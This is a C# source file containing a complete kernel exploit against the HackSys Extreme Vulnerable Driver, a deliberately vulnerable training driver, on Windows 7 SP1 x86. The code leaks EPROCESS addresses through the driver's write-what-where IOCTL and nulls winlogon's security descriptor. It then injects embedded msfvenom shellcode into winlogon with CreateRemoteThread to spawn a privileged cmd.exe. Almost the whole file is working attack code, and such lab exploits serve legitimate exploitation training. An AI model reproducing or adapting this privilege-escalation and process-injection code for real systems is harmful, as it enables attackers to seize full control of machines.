using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WriteNull
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public uint UniqueProcessId;
            public IntPtr HandleValue;
            public uint GrantedAccess;
            public short CreatorBackTraceIndex;
            public short ObjectTypeIndex;
            public uint HandleAttributes;
            public uint Reserved;
        }

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQuerySystemInformation(
            uint SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            ref int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            int dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            String lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // Global variables
        static IntPtr hDevice = IntPtr.Zero;

        // Helper functions
        static void CleanUp()
        {
            Console.WriteLine("[>] Cleaning up handle object(s)");
            if (hDevice != IntPtr.Zero)
            {
                if (CloseHandle(hDevice))
                {
                    hDevice = IntPtr.Zero;
                }
                else
                {
                    Console.WriteLine("[!] Failed to close a kernel driver's handle (code={0})", Marshal.GetLastWin32Error());
                }
            }
        }

        static bool IsWin7x86()
        {
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;
            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 6 && MinorVersion == 1 && BuildNumber == 7601 &&
                String.Compare(arch, "x86", StringComparison.OrdinalIgnoreCase) == 0)
            {
                Console.WriteLine("[+] Windows 7 SP1 x86 is detected");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported OS is detected");
                return false;
            }
        }

        static IntPtr GetCurrentEPROCESSAddress()
        {
            int STATUS_SUCCESS = 0;
            int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
            uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
            uint SystemExtendedHandleInformation = 0x40;
            int ntstatus = STATUS_INFO_LENGTH_MISMATCH;
            int pid = Process.GetCurrentProcess().Id;
            IntPtr ObjectPointer = IntPtr.Zero;

            Console.WriteLine("[>] Trying to get a process handle of current process");
            IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get a process handle of current process");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                return ObjectPointer;
            }

            Console.WriteLine("[+] Got a handle of current process");
            Console.WriteLine("    |-> hProcess: 0x{0}", hProcess.ToString("X"));

            Console.WriteLine("[>] Trying to retrieve system information");

            int SystemInformationLength = 1024;
            IntPtr infoBuffer = IntPtr.Zero;

            while (ntstatus == STATUS_INFO_LENGTH_MISMATCH)
            {
                int ReturnLength = 0;
                infoBuffer = Marshal.AllocHGlobal(SystemInformationLength);

                ntstatus = NtQuerySystemInformation(SystemExtendedHandleInformation, infoBuffer, SystemInformationLength, ref ReturnLength);

                if (ntstatus == STATUS_INFO_LENGTH_MISMATCH)
                {
                    Marshal.FreeHGlobal(infoBuffer);
                    SystemInformationLength = Math.Max(SystemInformationLength, ReturnLength);
                }
                else if (ntstatus == STATUS_SUCCESS)
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[-] Failed to get system information");
                    Console.WriteLine("    |-> NTSTATUS: {0}", ntstatus);

                    Marshal.FreeHGlobal(infoBuffer);
                    CloseHandle(hProcess);
                    return ObjectPointer;
                }
            }

            int EntryCount = Marshal.ReadInt32(infoBuffer);
            Console.WriteLine("[+] Got {0} entries", EntryCount);

            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entry = new SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX();
            int entrySize = Marshal.SizeOf(entry);
            IntPtr EntryOffsetPointer = new IntPtr(infoBuffer.ToInt64() + IntPtr.Size * 2);

            Console.WriteLine("[>] Searching our process entry (PID = {0})", pid);

            for (int idx = 0; idx < EntryCount; idx++)
            {
                entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(EntryOffsetPointer, entry.GetType());
                uint UniqueProcessId = entry.UniqueProcessId;
                IntPtr HandleValue = entry.HandleValue;

                if (UniqueProcessId == (uint)pid && HandleValue == hProcess)
                {
                    ObjectPointer = entry.Object;
                    Console.WriteLine("[+] Got our entry");
                    Console.WriteLine("    |-> Object: 0x{0}", ObjectPointer.ToString("X8"));
                    Console.WriteLine("    |-> UniqueProcessId: {0}", UniqueProcessId);
                    Console.WriteLine("    |-> HandleValue: 0x{0}", HandleValue.ToString("X"));
                }

                EntryOffsetPointer = new IntPtr(EntryOffsetPointer.ToInt64() + entrySize);
            }

            if (ObjectPointer == IntPtr.Zero)
                Console.WriteLine("[-] Failed to get target entry");

            Marshal.FreeHGlobal(infoBuffer);
            CloseHandle(hProcess);

            return ObjectPointer;
        }

        static IntPtr ReadDword(IntPtr what)
        {
            // To leak privileged process information, we use WRITE_WHAT_WHERE in this poc
            uint ioctl = 0x22200B; // ioctl of WRITE_WHAT_WHERE
            IntPtr inputBuffer = Marshal.AllocHGlobal(8);
            IntPtr where = Marshal.AllocHGlobal(4);
            int bytesReturned = 0;

            Marshal.Copy(BitConverter.GetBytes(what.ToInt32()), 0, inputBuffer, 4);
            Marshal.Copy(BitConverter.GetBytes(where.ToInt32()), 0, new IntPtr(inputBuffer.ToInt32() + 4), 4);

            bool status = DeviceIoControl(
                hDevice, ioctl, inputBuffer, 8, IntPtr.Zero, 0,
                ref bytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send ioctl query");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                return IntPtr.Zero;
            }

            IntPtr result = new IntPtr(Marshal.ReadInt32(where));
            Marshal.FreeHGlobal(inputBuffer);
            Marshal.FreeHGlobal(where);

            return result;
        }

        static IntPtr GetWinlogonEPROCESS(IntPtr EPROCESSPointer)
        {
            IntPtr CurrentEPROCESS = EPROCESSPointer;
            int pid;
            int winlogon;

            try
            {
                winlogon = (Process.GetProcessesByName("winlogon")[0]).Id;
            }
            catch
            {
                Console.WriteLine("[-] Failed to get process id of winlogon");
                return IntPtr.Zero;
            }

            Console.WriteLine("[>] Searching EPROCESS of winlogon");

            while (true)
            {
                pid = (int)(ReadDword(new IntPtr(CurrentEPROCESS.ToInt32() + 0xB4)).ToInt32() & 0xFFFFFFFF);

                if (pid == winlogon)
                {
                    Console.WriteLine("[>] EPROCESS of winlogon @ 0x{0}", CurrentEPROCESS.ToString("X8"));
                    return CurrentEPROCESS;
                }

                CurrentEPROCESS = ReadDword(new IntPtr(CurrentEPROCESS.ToInt32() + 0xB8));
                CurrentEPROCESS = new IntPtr(CurrentEPROCESS.ToInt32() - 0xB8);
            }
        }

        static bool InjectToWinlogon()
        {
            uint PROCESS_ALL_ACCESS = 0x1F0FFF;
            uint MEM_COMMIT = 0x00001000;
            uint MEM_RESERVE = 0x00002000;
            uint PAGE_EXECUTE_READWRITE = 0x40;

            // msfvenom -p windows/exec cmd="cmd.exe" exitfunc=thread -a x86 --platform windows -f csharp
            byte[] shellcode = new byte[] {
                0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
                0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
                0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
                0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
                0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
                0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
                0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
                0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
                0x00,0x53,0xff,0xd5,0x63,0x6d,0x64,0x2e,0x65,0x78,0x65,0x00 };

            Console.WriteLine("[>] Hunting winlogon process id");
            int winlogon;

            try
            {
                winlogon = (Process.GetProcessesByName("winlogon")[0]).Id;
            }
            catch
            {
                Console.WriteLine("[-] Failed to get process id of winlogon");
                return false;
            }

            Console.WriteLine("[+] PID of winlogon: {0}", winlogon);
            Console.WriteLine("[>] Injecting shellcode to the winlogon process");

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, winlogon);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get a winlogon handle");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            IntPtr Buffer = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (Buffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                CloseHandle(hProcess);
                return false;
            }

            Console.WriteLine("[+] Shellcode buffer is allocated at 0x{0} in winlogon process", Buffer.ToString("X8"));

            int ReturnedBytes = 0;
            bool status = WriteProcessMemory(hProcess, Buffer, shellcode, shellcode.Length, ref ReturnedBytes);

            if (!status)
            {
                Console.WriteLine("[-] Failed to write shellcode to winlogon");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                CloseHandle(hProcess);
                return false;
            }

            Console.WriteLine("[+] {0} bytes shellcode is written in winlogon process", ReturnedBytes);

            IntPtr hNewThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
                Buffer, IntPtr.Zero, 0, IntPtr.Zero);

            if (hNewThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to execute shellcode");
                Console.WriteLine("    |-> Error Code: {0}", Marshal.GetLastWin32Error());
                CloseHandle(hProcess);
                return false;
            }

            Console.WriteLine("[+] CreateRemoteThread is successful");
            Console.WriteLine("    |-> New thread handle: 0x{0}", hNewThread.ToString("X"));
            CloseHandle(hProcess);

            return true;
        }

        static void Main()
        {
            Console.WriteLine("--[ HEVD Exploitation : Write NULL\n");

            if (!IsWin7x86())
            {
                return;
            }

            // Step 1: Search Security Descriptor address of winlogon.exe
            IntPtr currentEPROCESS = GetCurrentEPROCESSAddress();

            if (currentEPROCESS == IntPtr.Zero)
            {
                return;
            }

            Console.WriteLine("[>] EPROCESS of current process @ 0x{0}", currentEPROCESS.ToString("X8"));

            // Step 2: Open driver's handle
            String deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
            uint GENERIC_READ = 0x80000000;
            uint GENERIC_WRITE = 0x40000000;
            uint FILE_SHARE_READ = 0x00000001;
            uint FILE_SHARE_WRITE = 0x00000002;
            uint OPEN_EXISTING = 0x3;
            uint FILE_ATTRIBUTE_NORMAL = 0x80;
            uint FILE_FLAG_OVERWRAPPED = 0x40000000;
            IntPtr invalid = new IntPtr(-1);

            Console.WriteLine("[>] Opening {0}", deviceName);
            hDevice = CreateFile(
                deviceName, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERWRAPPED, IntPtr.Zero);

            if (hDevice == invalid)
            {
                Console.WriteLine("[-] Failed to open {0} (code={1})", deviceName, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));

            // Step 3: Leak Security Descriptor address of winlogon.exe
            IntPtr winlogonEPROCESS = GetWinlogonEPROCESS(currentEPROCESS);
            IntPtr winlogonSD = new IntPtr(winlogonEPROCESS.ToInt32() - 4);

            // Step 4: Null out Security Descriptor of winlogon.exe
            uint ioctl = 0x222047;
            int BytesReturned = 0;
            IntPtr userBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.Copy(BitConverter.GetBytes(winlogonSD.ToInt32()), 0, userBuffer, IntPtr.Size);

            Console.WriteLine("[>] Sending query to HEVD.sys");
            bool status = DeviceIoControl(
                hDevice, ioctl, userBuffer, IntPtr.Size,
                IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send payload (code={0})", Marshal.GetLastWin32Error());
                CleanUp();
                return;
            }
            CleanUp();

            // Step 5: Inject shellcode to winlogon.exe
            if (InjectToWinlogon())
            {
                Console.WriteLine("[+] Exploit is completed successfully");
            }
            else
            {
                Console.WriteLine("[-] Failed to exploit :(");
            }
        }
    }
}